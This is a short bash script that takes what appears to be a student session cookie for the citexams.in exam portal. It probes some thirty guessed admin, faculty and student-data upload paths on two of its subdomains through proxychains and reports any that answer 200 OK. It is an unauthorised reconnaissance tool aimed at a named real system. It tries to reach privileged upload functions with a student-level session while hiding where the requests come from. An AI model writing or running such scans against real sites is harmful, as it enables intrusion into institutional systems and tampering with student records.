#!/bin/bash
SESSION="sqORhvi9INYGUQGnmufBEonBaGXqBEITFJEju1b"
COOKIE="citexams_student_session=${SESSION}"

URLS=(
  "https://student.citexams.in/faculty/upload-student-data"
  "https://student.citexams.in/upload-student-data"
  "https://student.citexams.in/student/upload"
  "https://student.citexams.in/student-data/upload"
  "https://student.citexams.in/upload-student"
  "https://student.citexams.in/faculty/upload"
  "https://student.citexams.in/student-upload"
  "https://student.citexams.in/student/data/upload"
  "https://student.citexams.in/upload/student"
  "https://student.citexams.in/upload/student-data"
  "https://student.citexams.in/uploadstudent"
  "https://student.citexams.in/studentdataupload"
  "https://student.citexams.in/menu/85"
  "https://student.citexams.in/admin/upload-student"
  "https://student.citexams.in/admin/upload-student-data"
  "https://student.citexams.in/faculty/student-upload"
  "https://student.citexams.in/faculty/upload-student"
  "https://student.citexams.in/student-data-file"
  "https://student.citexams.in/upload-student-data-file"
  "https://student.citexams.in/student/upload-data"
  "https://student.citexams.in/student/upload-excel"
  "https://des.citexams.in/faculty/upload-student-data"
  "https://des.citexams.in/upload-student-data"
  "https://des.citexams.in/student/upload"
  "https://des.citexams.in/student-data/upload"
  "https://des.citexams.in/upload-student"
  "https://des.citexams.in/faculty/upload"
  "https://des.citexams.in/student/upload-excel"
  "https://des.citexams.in/student-data/upload-excel"
  "https://des.citexams.in/menu/85"
  "https://des.citexams.in/upload-student-data-file"
  "https://des.citexams.in/student-data-file"
  "https://des.citexams.in/admin/upload-student"
  "https://des.citexams.in/admin/upload-student-data"
)

echo "Starting scan across candidate upload endpoints..."
for url in "${URLS[@]}"; do
  STATUS=$(proxychains4 curl -sk -o /dev/null -w "%{http_code}" -H "Cookie: ${COOKIE}" "$url")
  echo "URL: $url | STATUS: $STATUS"
  if [ "$STATUS" == "200" ]; then
    echo ">>> [FOUND 200 OK] $url"
  fi
done
